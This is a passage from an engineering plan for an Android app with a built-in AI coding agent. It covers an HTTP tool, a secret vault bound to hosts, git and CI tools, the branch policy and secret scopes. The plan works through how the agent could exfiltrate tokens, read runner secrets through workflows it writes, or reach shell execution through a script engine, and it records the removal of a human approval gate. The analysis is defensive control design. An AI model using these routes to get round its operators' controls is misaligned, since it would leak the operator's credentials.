decided, so "nothing matches" always arrives with the reason its index may be short. The comment
records that this was a real bug: the first version added the notes after the search and skipped them
on the way out, so a pass that ran out of time answered "nothing is indexed yet" with no reason.

**No silent no-op on a misconfigured model.** A model chosen after the index was built is **refused by
name**, not obeyed and not ignored — same dimensions do not rescue it, because two 1024-dimension
models are still two coordinate systems and a cosine between them lands in [-1, 1] and looks like a
score.

**No silent stale row.** A version whose commits no longer reach it is dropped and counted, rather
than answered with an id `read` cannot use.

**What the audit changed.** Two real defects, both from showing a fifth of what had been paid for:
a row showed `excerpt(one.text)` — 160 characters of an 800-character chunk, so the embedding and the
reranker both worked on text the answer then threw away; and semantic `history` filled `paths` with
thirteen rows about one paragraph, because every version of a file scores the same. Rows now carry the
whole chunk with its line range, and collapse only genuinely duplicate rows.

### The gaps that remain, stated rather than hidden

1. **`http` has made no real request in CI.** `LiveHttpTest` exists and is skipped by default. Run it
   with `MUFFY_LIVE_HTTP=1` before relying on `http` for anything that matters.
2. **`pull`/`push` have never run against a real remote.**
3. **`MediaStore` has never run on a device.**
4. **`CiSetup` has no UI door** — a tested function nothing calls.

## 9. What is kept, and the evidence for each

These were each considered for removal and each has a reason that is a *measurement*, not a preference.

| Kept | Why it cannot collapse |
|---|---|
| **`mcp`** | Checked, not assumed: `Mcp.kt:332` performs **three** POSTs — `initialize`, `notifications/initialized`, `tools/call` — with `Mcp-Session-Id` echoed between them, accepting `text/event-stream`. `http` is **one** request. Replacing it makes the model hand-assemble a JSON-RPC session across three calls and remember a session id, and breaks on the first SSE answer. **`mcp` is a protocol, not a request.** |
| **`browse`** | Backed by `WebViewBrowser` — Chromium from the OS, no APK cost. Runs JS, waits for a condition, extracts text. **No HTTP request returns a rendered page.** |
| **`shot`** | Same engine, `drawToBitmap`. **No HTTP request returns a picture of a rendered page.** |
| **`push` / `pull`** | The git protocol: ref negotiation + packfile. `push` takes **no arguments** — the app resolves the repo, remote, token, LFS objects and refs. Reimplementing it on `Fetcher` means writing a packfile builder and re-earning the dirty check, LFS-before-refs and `RepoLocks`. **Git is a peer of HTTP, not a special case of it.** |
| **`ci` / `runs` / `artifact`** | They **open the seal** (`EncryptedLog.read`, `openBytes`) and unpack the zip. `http` would hand the agent ciphertext and force it to know about `MUFFY_LOG_KEY` — exactly the machinery the operator wants out of its way. They are the shortest expression of the common path. |
| **`state`** | The reading half of push: an agent cannot decide *when* without knowing whether there is anything to send. |

**The rule that keeps them honest:** each is a *convenience over `http`*, and any one that grows a
mechanism `http` cannot express is a candidate for deletion. None has.

---

## 10. Rejected, with evidence

### 10.1 An embedded sequence/protocol runner (YAML DSL or `.http` runner)

Two real tools exist and **both are wrong for this app** — not in general.

- **JetBrains HTTP Client (`ijhttp`)**: its POM depends on `com.jetbrains.intellij.platform:core`,
  `analysis-impl`, `core-impl`, `util` — **the IntelliJ platform**. It is not a library, it is a slice of an
  IDE. No Android story.
- **Karate**: `karate-js` is a genuinely good from-scratch JS engine with zero dependencies (it avoids
  `javax.script`, which Android lacks). But `karate-core` pulls in **`httpclient5`, Netty**, snakeyaml,
  fastcsv, thymeleaf, picocli, json-path. Two consequences: **it duplicates `Fetcher` and bypasses
  `Addresses.problem`** — quietly retiring the app's "address rule first, before anything is opened" — and
  **Karate's JS has Java interop**, so an LLM inside the app that holds the vault could reach
  `Class.forName` → `Runtime.getRuntime().exec`. That is `sh` with a worse surface.

**What survives from the idea:** `.http` files are a de facto standard, so an agent may already know how to
write one. That argues for a **very small closed subset** — requests in order, named variables captured from
earlier responses, **no loops, no conditionals, no JavaScript**. A sequence that can loop is a program, and
a program needs an interpreter, and an interpreter needs a sandbox this app does not have.

**Build it only after `http` has been used, and only with evidence of what the two-call pain actually was.**
A sequence runner that hides the middle step also hides which step failed.

### 10.1b To be unambiguous: **the plan does not include a `.http` runner, and part A does not build one**

`http` takes **one request** — `method`, `url`, `headers`, `body`, `auth`. There is no `file:` key, no
`sequence:` key, and no second argument that turns it into a program. That is deliberate and it is the whole
of §3.

If a runner is ever built, the smallest honest shape is **a separate tool** (`httpseq`) with these limits,
written down now so the argument does not have to be had twice:

- **Requests in order, no branching.** `GET → POST → POST`, each answer filed to `agent/http/`.
- **Named variables from a JSON path of an earlier answer** — `{{runs[0].id}}` — and nothing else.
- **Every step through `Fetcher.request`**, so the address guard, the vault and the filing rule apply
  unchanged. **This is the one non-negotiable requirement:** a runner that opened its own sockets would
  retire `Addresses.problem` (§10.1, the Karate finding).
- **A step that fails stops the sequence, and the answer names the step and its status.** A runner that
  reported one failure for five steps would be worse than five calls.
- **No `file:` reading of a second `.http` file** — one file, one sequence, one answer.

### 10.2 Artifact upload as the agent's "stdin"

There is **no upload path in `GitHub.kt`** — `artifacts` and `artifactBytes` are both download-only. It is
tempting to add one so the agent can "post files to a workflow". **Don't.**

A file in the repo — written, committed by `write`, pushed — is visible to every job's checkout, is
versioned, and the agent already knows how. An artifact upload happens **after** the run starts, needs the
run id, goes to a different host (`pipelines.actions.githubusercontent.com`), and is invisible to the
checkout.

**The stdin is a commit.** The only file-post `http` needs is `body: "@path"`.

### 10.3 A `Ci` interface over GitHub and GitLab

It looks like the same abstraction and is not: the *model* differs (workflow file vs `.gitlab-ci.yml`), the
*trigger* differs (dispatch vs pipeline variables), the *artifact* differs, and the *secrets* differ
completely. The interface would be either so thin it saves nothing, or it would force GitLab into GitHub's
shape and lose what makes it usable. **The app is GitHub-shaped above the git layer, and `http` is how
anything else is reached.**

### 10.4 A remote config that pretends CI is portable

A config can get you **clone, push and pull against any HTTPS git host** — the genuinely portable part:

```json
{
  "name": "gitlab",
  "cloneUrl": "https://gitlab.com/{owner}/{name}.git",
  "api": "https://gitlab.com/api/v4",
  "auth": { "header": "PRIVATE-TOKEN", "secret": "gitlab-token" }
}
```

It **cannot** get you workflows, artifacts or releases. A config that pretended otherwise would be a
fiction, and the agent would write a workflow that silently never runs.

**This config is not in the five parts** — it is optional, and Part B (the `isGitHubHost` fix) delivers the
portability without it. Build the config only if a second host is actually wanted.

---

## 11. Two limits, two jobs — already built

The operator asked whether the size limit is already handled by the loop. **It is, and there are two of
them doing different work:**

| Limit | Protects | Where |
|---|---|---|
| `forConversation` (token budget) | **the context** | `AgentTools.kt:4361` — already applies to every tool |
| `LIMIT_BYTES` (100 MB) | **the process** | `Fetcher` — counted **while reading** |

**`forConversation` cannot replace `LIMIT_BYTES`:** `fetch` writes bytes to a file and never puts them in
the conversation, so `forConversation` sees a sixty-character sentence and never sees the 100 MB. A cap that
fires after the phone has buffered two gigabytes is not a cap.

**`http` adds neither.** It reuses both, in the places that already exist.

---

## 12. Order, and why that order

| # | Part | Size | Why here |
|---|---|---|---|
| **1** | **E — the refresh hook** (§7) | ~30 lines | **Smallest, most visible, fixes a live bug.** Do it first so the rest is watchable. |
| **2** | **B — `isGitHubHost` says why** (§4) | ~10 lines | **A live bug.** The guard is right; its silence is the bug. Widening it would leak the token. |
| **3** | **A — `Fetcher.request` + `http`** (§3) | ~180 lines, 12 tests | The core. Test 4 (the vault never leaks) **before the tool is reachable by a model**. |
| **4** | delete `fetch`, rename the switch (§8) | small | Follows immediately from 3. |
| ~~5~~ | ~~**C — provider config**~~ (§5) | — | **Withdrawn by the operator.** The schema as it is is good enough; git, http and secrets matter more. |
| **6** | **D — the folder rule, `replaceWithRemote` removed, `diff`, `state` removed** (§6) | ~200 lines, and **net negative** | The folder rule decides what git sees; `diff` is revisions-only because every tracked change is committed; and removing `replaceWithRemote` takes out a dialog, a `Pending`, two service methods and a test. |
| **7** | one real call by hand against the GitHub API | — | Prove the shape end to end before trusting it. |

**Parts 1 and 2 are a morning's work and each fixes something that is wrong right now.** That is deliberate:
the plan starts with the two things that are bugs, not with the two things that are features.

### 12.1 What was built, and what reality contradicted

**Parts 1, 2, 3 and 3b are done and green.** Written down here because the plan is a record of what happened
rather than of what was intended.

| # | Built | The plan was wrong about |
|---|---|---|
| **1** | `f46ab74` — the refresh hook | Nothing. ~30 lines as estimated. |
| **2** | `56a030c`, `d951ac8` — the host guard | **The proposed fix was wrong.** Widening `isGitHubHost` to "a host we hold a token for" would send a GitHub token to `gitlab.com`, because `tokenKey(login)` is one token per login and the login comes from GitHub's `/user`. The guard was right; its silence was the bug. **A real leak was found while checking:** `pushNow` had no guard at all and attached the key to whatever `origin` said. |
| **3** | `78b45a6`, `8bd4694`, `cc49c00` — `Fetcher.request` + `http` | The size estimate held (~180 lines + ~20 tests). Two Kotlin facts cost a round each: the schema is built **from the example**, so an example naming three of five arguments leaves two the model cannot know about; and `AgentLog`'s constructor is private, so a test builds one with `open`. |
| **3b** | `99ad20c`, `62a0e0f`, `2a68d33` — `secret(name, host)` + the screen | **The host binding had to be two-way**, which the plan did not anticipate: `AgentTools` reads `MUFFY_LOG_KEY` to decrypt a CI log, and that key is never sent anywhere. Special-casing the caller would have been wrong; an empty host now means "travels nowhere" and the two kinds cannot be confused in either direction. **Also found: the vault had no door at all** — `setSecret` was called by nothing outside tests. |

### 12.2 Part 4 and Part D, and the six rounds they cost

**Both are done.** Part 4 deleted `fetch`; Part D built the folder rule, `git {op: diff}`, and removed
`replaceWithRemote` and `state`.

| # | Built | The plan was wrong about |
|---|---|---|
| **4** | `b3b1678` — `fetch` deleted | **The plan said `fetch` was "`http` with GET and a fixed folder". It was not.** `fetch` listed what is inside a downloaded zip, and `http` had no equivalent — so deleting it would have quietly lost the answer to "which files did this dependency tarball produce". `archiveListing` moved into `http` first. **Also: `fetchAllowed` could not simply be renamed** — the stored pref key `KEY_FETCH` is on every phone, and renaming it would silently turn the switch back **on** for anyone who had it off. A security setting that resets itself is worse than a name that reads oddly, so `keepHttp` writes `KEY_FETCH`. |
| **D** | `31c06da`, `a489a20`, `8be8957`, `6cd1876`, `09335bf`, `7caffe9` | **`shouldIgnoreOnCreate = kindOf != TEXT` is wider than the plan's own table said**, and I had the direction backwards at first: the rule was `== UNKNOWN`, and `EntryKind` has a separate `IMAGE`, so **pictures were born tracked** — which is *why* `LFS_ATTRIBUTE` is a list of image extensions. **And `FOLDER != TEXT` is true**, so the one-line form ignored every folder a person made and `createFolder` refused, taking a whole screen's behaviour with it. **`GitService.Changes` was already taken**, so the new data class shadowed it: fine in one file, broken everywhere both were in scope. **`NullOutputStream()` does not compile** — the class has a private constructor and is exposed as `INSTANCE`. |

**Six CI rounds, and every one was a Kotlin fact QC cannot see.** QC does not type-check; the compiler
is the only checker and CI is the only compiler. Four of the six would have been caught by reading the
declaration rather than the call site:

1. `commit()` returns `String?`, not an object with `.id`.
2. `NullOutputStream` has a private constructor — `INSTANCE`.
3. `GitService.Changes` already exists; mine shadowed it.
4. Four test files still called `replaceWithRemote` after it was deleted.

**The lesson is narrower than "be careful".** The pattern is: *a symbol whose shape I assumed rather than
read*. Each of these was one grep away — `fun commit(`, `data class Changes`, the jar's field list — and
none was found by reading my own new code.

**Three CI rounds were spent on test defects rather than product defects**, and each is worth remembering:

1. `hostOf("file:///tmp/x")` answered `file` — a scheme with no authority is not a host. Every signing test
   failed on it, because the test GitHub on disk clones from a `file:` URL.
2. `MemoryCredentials` inherited the interface's `null` for `secretHost`, so a refusal that should have named
   `api.github.com` said "this phone only" — the fake could not produce the sentence the test asserted.
3. A scrollable `Column` inside an `AlertDialog` never reports idle in Robolectric, so every test that typed
   into a field waited sixty seconds and the suite ran out of memory.

**The lesson in all three:** a fake that inherits a default is a fake that agrees with nothing, and a test that
asserts a sentence is only as good as the fake's ability to produce it.

---

## 13. Risks and open questions

- **`http` is the first tool that can write to a foreign system on the agent's own initiative.** `push` was
  the only outward act before. The refusals in §3.3 are the guard, and test 4 is the one that must never be
  deleted.
- **The vault cannot bind a secret to a host yet** (§3.3b). Until it does, `auth:` is a token-exfiltration
  primitive: the agent names the secret, the app resolves it, and it goes to a host of the agent's choosing.
- **`git checkout` on a phone is untested.** It can rewrite hundreds of files, and this app has no undo
  beyond history. It may need a confirmation rule that `revert` does not.
- **The `git` tool's closed set will be argued with.** Every `op` not in the list becomes a request. The
  answer is that `http` cannot help here, so the list grows deliberately or not at all.
- **`push`/`pull` have still never run against a real GitHub remote** — the offline suite only. That
  predates this plan and this plan does not fix it.
- **A hang, OOM kill or cancelled CI run still emits no readable log or artifact.** Known, accepted cost.

---

## 13b. One branch, one actor, no theatre — the settled decisions

Recorded 2026-11-07 after a long conversation with the operator. **Most of this section is deletion.**
The tree gets smaller, and several features that looked like safety turn out to be claims rather than
guarantees.

### 13b.1 One branch: `main`

The two-lane split (person → `main`, agent → `development`) was the operator's own earlier decision,
and it is ended: *"lets keep only main"*.

- `AgentTools.AGENT_BRANCH` → `AgentTools.BRANCH = "main"`. The dispatch guard stays, but it is now a
  **typo check, not a boundary** — there is only one branch for it to agree with.
- **`.github/workflows/build-and-release.yml` keeps `branches: [main, development]`, and this was a
  mistake worth recording.** The first version of this change narrowed it to `[main]`, reasoning that
  one branch meant one trigger. **That conflated two different things**: the app's model for a *user's
  project* is one branch, and muffycodes' own CI is a repository developed on `development` and
  released from `main`. Narrowing it stopped every run for three commits before anyone noticed — the
  exact failure a CI file must not have. The file now says so at the top, because the next person to
  read "one branch" will reach for the same edit.
- `ReleaseKey.BRANCHES` → `listOf("main")`.
- **The `development`-only steps stay**, for the same reason: they are this repository's own
  pipeline, not the app's rule. A push to `development` still produces `dev-apk` and `build-bundle`,
  and `main` still publishes.
- **The publish guard stays `ref == 'refs/heads/main'` and does NOT gain an event condition.** A draft
  of this change added `event_name == 'push'`, reasoning that the branch was the only thing stopping an
  agent from publishing. That reasoning was right about the mechanism and wrong about the intent: the
  operator wants the agent able to make releases, and `Release.start` publishes through
  `workflow_dispatch`. Adding the condition would have broken the app's own release button.

#### Corrected twice, and the operator settled it

**This repository and a user's project are two different things, and I conflated them twice.**

1. **First mistake:** I narrowed *this* repo's trigger to `[main]`, on the reasoning that one branch is
   the model. But muffycodes develops on `development` and releases from `main`, so **three commits got
   no CI at all** before the silent watcher gave it away. Fixed in `2a3b6ee`: trigger restored to
   `[main, development]`, and the file now says at the top which branch is which and why.
2. **Second mistake:** having been corrected, I over-corrected and reported that the operator's "one
   main branch" instruction must mean the app's rule for *user* projects, not this repository. **The
   operator's ruling, 2026-11-07:** *"muffy (WHICH WAS RENAMED INTO pechka-ai) should follow the same
   one main branch logic as everything so your first understanding was COMPLETELY RIGHT."*

**So the position, stated once and final:**

| repository | branches | why |
|---|---|---|
| **a user's project** | **`main` only** — person and agent both push there | `AGENT_BRANCH` → `BRANCH = "main"`, `ReleaseKey.BRANCHES = ["main"]`, workflow trigger `[main]` |
| **pechka-ai** (this app's own repository, formerly muffycodes) | **`main` only** | The same rule, for the same reason: one actor, one branch, no lane split |
| **the `development` branch that exists today** | **to be collapsed into `main`** | 805 commits ahead, 11 behind. Merging it and deleting it is the work; it is *this* repo's tidy-up, not a rule for user projects |

**The lesson, and it is the same one that keeps recurring in this session:** I answered a question about
the app's model by editing the repository I was standing in. The two share words — "branch", "main",
"release" — and nothing about the sentence distinguishes them. **When the subject is a user's project,
the file to change is `AgentTools`/`ReleaseKey`, never `.github/`.**

### 13b.2 The workflow lock gate is deleted

`start()` refuses to dispatch a workflow that names an environment unless a person has **locked** the
file. The operator's argument, and it is decisive:

> *"I hate workflow approval gate... relying on human to check the code before it is dispatched isnt a
> guarantee and a bad experience — better to trust the agent more and just prevent accidental mistakes
> with http auth."*

**The gate's premise is that a person audits the YAML, and that premise fails three ways:**

1. **The YAML is not the danger.** `run: ./script.sh` — the danger is in the script, which the agent
   wrote and can rewrite after the lock. Locking a file that calls a file locks nothing.
2. **It does not scale.** Every new workflow needs a press. The natural response is to lock
   everything, which is the same as locking nothing.
3. **It inverts the trust model.** The agent can already push a workflow file and let `push` trigger
   it — no gate, no press. So the gate blocks the *dispatch* path while leaving the *push* path open.

**What is kept:** `isLocked` still means "the agent may not overwrite this file". That is a different,
useful rule about *writing*, and it stays.

**What replaces the gate:** nothing in the app. The only mechanism that actually constrains a runner is
**required reviewers on the `release` environment**, which GitHub enforces whatever started the run.
That is a press on an *act*, not an audit of *bytes*.

### 13b.3 No workflow split

The idea was `build.yml` (`contents: read`, artifacts) + `release.yml` (`contents: write`, releases).
**It buys nothing**, because the agent can write a workflow declaring `contents: write` itself. One
actor, one capability. **One workflow file.**

### 13b.4 GitHub secrets are theatre, except one

The operator's argument, which is airtight:

> *if secrets available on github are not secrets then we dont even need to hide them... only http
> secrets make sense because they are protected with destination guard.*

The chain: a secret in a runner is readable by the code in that runner; the agent writes that code;
therefore **any secret the agent's workflows can use, the agent can read**.

- **No GitHub-secret management UI.** The two API calls it would need
  (`GET /repos/{o}/{r}/actions/secrets/public-key`, `PUT .../secrets/{name}`) are not written.
- **No environment secrets beyond signing.** `MUFFY_LOG_KEY` moves to a gitignored project file, where
  it is honestly not a secret rather than dishonestly one.
- **The signing key stays an environment secret with required reviewers**, and it is the *only* one.
  Its danger is not "the agent learns it" — it is that **it is published forever**: anyone can extract
  it from the APK, and every future update must be signed with it or devices refuse the update. It is
  the only irreversible secret in the system.
- **`http`'s `auth:` guard stays and is the model to follow.** It is the one guard in the system that
  constrains the *agent* rather than gating a *person*: a secret stored for `api.stripe.com` cannot be
  sent to `evil.com`, whatever the agent writes. It costs nothing and it is real.

### 13b.5 No encryption anywhere

Three designs were considered and all are rejected:

| Design | Why rejected |
|---|---|
| Encrypted archive on the remote, decrypted on pull | Git push/pull are ref updates, not file transfers. A blob has no git server; push becomes "upload a bundle file", pull "download and fetch from it". **Whole history every time**, and the app must own "what has the remote got" — which is exactly what git's ref negotiation does for free. |
| Clean/smudge filter (git-crypt's design) | Works, and JGit has the API (`FilterCommand`, `FilterCommandRegistry`). But **LFS stores bytes outside git**, so no filter can reach a picture — and pictures are the bulk of a notes project. Filtering everything means dropping LFS and growing history by every picture version forever. |
| Encrypt the transport | Not possible: **a git object's name is the SHA-1 of its content.** Changing the bytes changes the identity, so the tree no longer points at the object. Making it work means rewriting every commit — that is a rebase on every push. |

**The decision: open or private is the user's choice at project creation, and nothing is encrypted.**
That choice already exists — `PRIVATE_LICENCE` is the default in the licence window (`Dialogs.kt:490`),
and a licensed repository is public. No work needed.

#### What `EncryptedLog` is, and what it is not — corrected

**The operator asked, and the answer matters because I described it badly:** *"what is this encrypted
log? we dont encrypt artifacts or logs, right? those are just workflow examples that can be dispatched
by everyone - those are example files, not built-in parts of the application, RIGHT!?"*

**Right, and the wording above overstated it.** The measured facts:

| claim | true? | evidence |
|---|---|---|
| The app encrypts logs or artifacts | **No** | `EncryptedLog` is a **reader** (`openBytes`, `read`) plus, as of this session, a **writer** (`sealBytes`). Nothing in the app calls the writer on its own output. |
| The app forces a user's project to seal anything | **No** | `CiSetup` **writes no workflow file at all** — it only sets an environment secret. `Workflows.kt` only *detects* sealing (`text.contains("openssl enc")`) to describe what a workflow can reach. |
| Sealing happens by default | **No** | It happens only in **this repository's own** `.github/workflows/build-and-release.yml`, which is muffycodes' CI, not a template shipped to users. |
| An unsealed artifact is mishandled | **No** | `openBytes` returns it **as it arrived**: *"Not sealed is not a failure."* The reader is a pass-through for anything it did not seal. |
| A user's workflow can seal | **Yes, optionally** | Sealing is a **shell command in a workflow file** — `openssl enc`, or `gpg --encrypt`. Whoever writes the workflow chooses it. It is a technique the app can read, not a feature it imposes. |

**So the honest one-sentence version: sealing is a thing a workflow author may do, and the app can read
it. The app never does it to you, and never requires it.**

**Why it exists at all, since §13b.5 says "no encryption anywhere":** those are different questions.
§13b.5 rejects encrypting **git history at rest or in transit** — a project's bytes. `EncryptedLog` is
about **a public runner's log**, where a failing test prints the expected and actual values and a
stranger reads them. That is the one place encryption is both possible (the plaintext never has to
leave the runner) and pointed (the leak is real, in public, and permanent). It is a **CI hygiene
option**, not a storage model, and the app works identically for a project that never uses it.

**`seal`/`unseal` on `archive` (added this session)** is the same idea in the agent's hands: the agent
may seal a file before putting it somewhere a stranger can see, and open one it was given the key for.
Nothing about it is automatic.

### 13b.6 Token separation: app token and agent token

The operator's decision: *"we need to separate the token agent uses and what app uses. we can add
secrets scope to app's access token and mint repo scoped tokens for agents."*

**Measured constraint, and it decides the mechanism:** GitHub's API can create fine-grained PATs **only
for organizations, and only from a GitHub App**. A user cannot mint a scoped PAT from another token.

So "mint a repo-scoped token" means **a GitHub App**, not a PAT:

| | today | with an App |
|---|---|---|
| Identity | the person's OAuth user token | an App installation |
| Scope | every repo the person can reach | the repos the App is installed on |
| Lifetime | until revoked | **1 hour**, auto-renewed |
| Minted by | device flow | JWT → installation token |

**What this costs:** a GitHub App must be registered (a second registration beside the OAuth App), and
its private key must live somewhere — which puts it back in the "a secret in an APK is not a secret"
problem the device flow was chosen to avoid (`DeviceFlow.kt:10`). An App's private key cannot be
device-flowed.

**What is buildable without an App, and is most of the value:** keep the user token for the *app*, and
give the *agent* nothing — because every agent operation already targets exactly one repository:

| agent call | target |
|---|---|
| `push` | this project's remote |
| `ci` / `runs` / `artifact` | this project's repo |
| `http` | a vault secret bound to a host |

**So the agent never needs a cross-repo token.** The cheapest real improvement is to **drop
`delete_repo` from `TokenScopes.REQUIRED`** — it is the one irreversible capability in the set — and
have "delete project" leave the remote and tell the person to delete it on github.com. That reduces
blast radius with no new registration and no new key.

### 13b.7 The publish button, where Sync was

`AppViewModel.startRelease(versionName, devBuild)` at `:3473` calls `Release.start` at `:3489`, and
**nothing calls `startRelease`.** `Release.start`, `Release.nameProblem` and `Release.Report.said()` are
all tested and all **unreachable** — the app cannot publish a release from inside it at all. The same
defect `CiSetup` had before it got a door.

**The operator chose design B: a prominent button in the sync slot on the project row**, because *"it
is prominent and operator may see that local git has no new commits after last push and just press a
button."*

The slot is free — `BrowserScreen.kt:591` removed the Sync button when that decision moved to the
agent. **But a release is a different question from a sync.** Sync asks "send what is here", and the
reason it was removed is that two writers could disagree about *which commit is being sent*. A release
names a **version**, and only a person decides that.

States for the button:

| project state | button |
|---|---|
| local, no remote | nothing (the menu has "Put on GitHub…") |
| synced, N unsent | **"N unsent"** — information, not an action, exactly as today |
| synced, up to date | **"Publish…"** |

Tapping "Publish…" opens a dialog with one field (the version name) and a `devBuild` checkbox, showing
`Release.nameProblem` inline as the person types. **The dialog is tested as a function, not driven** —
`AlertDialog` never reports idle under Robolectric in this repo, which is a known limit.

### 13b.8 One vault, three scopes

**The operator's decision, 2026-11-07:** *"one single secrets vault and one window to manage it in
settings. and scope selector field that user can choose all projects or some specific project from the
list of projects inside the app. and when project is deleted secrets from its scope are also
deleted."*

Today the vault has **one scope**: `secret_${login}_$name`, so a secret added for one project is
readable by the agent in **every** project. For a shared `stripe` key that is right. For "the API token
for this client's system" it is not.

#### The three scopes

| scope | key shape | who can read it | why it exists |
|---|---|---|---|
| **app** | `token_$login`, `modelKeyKey(login)` — **a separate pref namespace** | the app only | The agent must never be able to name these, and it cannot: `secret()` reads `secret_` keys, so **no `auth:` value resolves to a token**. Unreachable by construction, not by policy. |
| **account** → **general** | `secret_general_$name` | every agent, on every project, whatever the account | A key several projects share |
| **project** | `secret_project_${project}_$name` | agents in **this project only** | A key that belongs to one project |

> **SUPERSEDED BY §13c.4.** The middle scope is **general**, not per-account, and the login leaves the
> secret key. This section's reasoning about *why* three scopes exist stands; its key shapes do not.

**The app scope does not move into the vault.** It stays a separate namespace, because the fact that
`http {auth: …}` cannot reach the GitHub token is worth more than the tidiness of one model. That
guarantee is structural — there is no name to guess — and folding it into a scope field would replace
a construction with a rule.

#### Resolution order

`http {auth: "x"}` asks **project first, then account**:

1. `secret_${login}_${project}_x` — if present, that is the answer
2. `secret_${login}_x` — otherwise the account-wide one
3. neither → the refusal names **both** places it looked, so a person knows which scope to add it to

**A project secret shadows an account secret of the same name**, and that is deliberate: a project that
needs a different key for the same service should be able to say so without renaming anything. The
refusal for a *wrong-host* secret says which scope it was found in, because "stored for another host"
and "stored for another project" are different facts and only one of them is fixable by editing a host.

#### What the window shows

**One screen** — `SecretsScreen`, which already exists. Each row gains its scope:

```
stripe            api.stripe.com        all projects
acme-api          api.acme.test         acme-site
MUFFY_LOG_KEY     (this phone only)     all projects
```

**The add dialog gains one field**: a scope selector, a dropdown of **All projects** plus the list of
projects. It **defaults to the project the person came from** when the screen was opened from a project,
and to **All projects** when opened from Settings — because the safer default is the narrower one, and
the screen is reached both ways.

#### Deletion

**Deleting a project deletes that project's secrets**, in the same act, before the folder goes. This is
the rule the operator asked for and it is also the only correct one: a secret whose project no longer
exists is a row nothing can ever read, and leaving it would be a leak nobody can see.

**Account secrets are untouched** — they were never that project's.

The deletion is ordered **secrets first, folder second**, because the reverse leaves a window where the
folder is gone and the secrets are not, and nothing would then know which project they belonged to.

#### What this costs

| place | change |
|---|---|
| `CredentialStore` | five secret methods gain a `project: String?` parameter (null = account scope) |
| `AppViewModel` | four wrappers follow |
| `AgentTools` | two `auth:` call sites pass `project` — which it already holds as a field |
| `Scenario.kt` `MemoryCredentials` | the override follows |
| `SecretsScreen` | a scope column and a scope selector |
| project deletion | one call, before the folder goes |

**~12 call sites, all mechanical**, and the migration is free because **no project secrets exist yet** —
there is nothing to move.

#### What it is not

**It is a blast-radius control, not a secrecy control.** The agent runs with the vault available, so a
secret in *this* project's scope is readable by any code the agent writes *in this project*. What
project scope prevents is project A's agent reading project B's key. That is worth having, and it is
less than it sounds.

**Same sentence for the app scope:** the GitHub token is unreachable through `auth:`, but the app's own
tools still use it (`ci`, `push`), so the agent acts with it. What is prevented is the token travelling
to an arbitrary URL, not the agent using GitHub.

### 13b.9 Open, and their costs

**All four were decided on 2026-11-07. None is open any more.**

| # | Decision |
|---|---|
| 1 | **Drop `delete_repo`.** "Delete project" leaves the remote and says so; the person deletes it on github.com. It is the one irreversible capability in the token set and the app does not need it. |
| 2 | **The size limit moves to Settings**, default 100 MB. `Fetcher.LIMIT_BYTES` becomes a pref read at the six call sites. |
| 3 | **Release by run id: not now.** It is the one piece of the workflow split worth keeping, and it is a feature rather than a cleanup — a run picker, a workflow step, and a decision about what happens when the artifact has expired. Recorded, not scheduled. |
| 4 | **No GitHub App, yet.** Its cost lands on the one decision (`DeviceFlow.kt:10`) that made sign-in secretless, and item 1 gets most of the benefit for none of it. |

### 13b.10 The order this is built in

**Each step is separately shippable and separately verifiable.** The tree is never half-changed between
commits.

| # | Step | Why here |
|---|---|---|
| 1 | One branch: `main`, `[main]`, `ReleaseKey.BRANCHES`, dead conditions marked | Smallest change, and everything else assumes it |
| 2 | Delete the workflow lock gate | Deletion; nothing depends on it once it is gone |
| 3 | Drop `delete_repo` from `TokenScopes.REQUIRED` and `DeviceFlow.SCOPE` | Two constants and one message; independent of everything |
| 4 | Size limit in Settings | Independent; one pref and six reads |
| 5 | Project-scoped secrets | The largest; touches `CredentialStore`, `AppViewModel`, `AgentTools`, `SecretsScreen`, project deletion. **See §13c.5 — the key shapes are settled there first** |
| 6 | The publish button in the sync slot | Needs nothing from 1–5, but it is the one that changes a screen, so it goes last |
| 7 | `unseal`, so `http` covers artifacts | Optional; only worth it if `artifact` proves redundant |

## 13c. The app is about projects, not about a selected account

**The operator's decision, 2026-11-07:** *"main menu is about projects listed on the app, not just one
account. There should be no selected account, but a list of added accounts to the app. and main menu
should show projects from all accounts, and when you add a project you select to what account from
added. Settings should apply to the app and all of its projects independent of their accounts.
Therefore secret scopes are app/general/project, so that general secrets are accessible from all
projects."*

This **replaces** the account-scoped model the app was built on, and it supersedes the `account` scope
in §13b.8.

### 13c.1 What is true today, measured

| thing | today | where |
|---|---|---|
| **Settings** | **already app-wide.** One `SharedPreferences("settings")`, constructed once with no account in it | `SettingsStore.kt:24`, `AppViewModel.kt:38` |
| **Vault** | **already app-wide.** One `SharedPreferences`, keys carry the login — `token_$login`, `secret_${login}_$name` | `CredentialStore.kt:221` |
| **Projects** | **per account, on disk.** `accounts/<login>/<project>/` is the repository | `Workspace.kt:92` |
| **The project list** | `Workspace.projectNames()` lists **one account's** folders | `Workspace.kt:1362` |
| **Which account is active** | one `activeLogin`, chosen in a picker, and everything hangs off it | `AppViewModel.kt:151`, `:518` |
| **Model key** | `modelKeyKey(login)` — **per account**, so each account needs its own OpenRouter key | `CredentialStore.kt:292` |

**So Settings already does what the operator asked.** The change is not to settings; it is to the
**project list** and to the **vault's middle scope**.

### 13c.2 The model — accounts as folders, revised 2026-11-07

**The operator's refinement:** *"can we in main menu show a list of accounts and then user can simply
enter or exit folders of different accounts and there see their projects? will it reduce the scope? and
we can make it so that + button on accounts screen allows adding and removing accounts - so that we dont
need account block in settings."*

**Yes to all three, and it reduces the scope substantially. This replaces the "one flat list spanning
all accounts" model below.**

The main menu becomes **a list of accounts**. Entering one shows its projects; leaving it shows the
accounts again. The `+` on that screen adds and removes accounts. Settings loses its account block.

**Why this is better than the flat list, measured:**

| fact | today | with folders |
|---|---|---|
| `AgentRunner` holds **one** `Workspace` (`AgentRunner.kt:24`) | the agent ticks only the active account's sessions | **unchanged — already correct** |
| `tickAgents` says *"Nobody is signed in, so there is no account whose sessions could be due"* (`AppViewModel.kt:4602`) | one account is running | unchanged |
| the agent's model key is `modelKeyKey(login)` (`CredentialStore.kt:292`) | per account | unchanged |
| `activeLogin` (`AppViewModel.kt:151`) | a mode the app is in | **the account you entered** — still one at a time |

**The flat list would have needed the agent to run every account's projects at once.** That means N
runners, N WebViews (`WebViewBrowser` is bound to one Looper thread for life — the code already says
two runners is already a compromise), and a question nobody asked: *should a project under an account
you are not looking at be spending your tokens?* **The folder model keeps "one account active" true, so
none of that is needed.**

**What the person gains, in their own terms:** they can *enter and exit* accounts to navigate, rather
than being trapped in whichever one is selected. That is the whole of the requested change, and it is
navigation, not concurrency.

#### The model, stated

- **The main menu is the account list.** Each row is an account: its login, how many projects it holds,
  and its state (signed in / provisional).
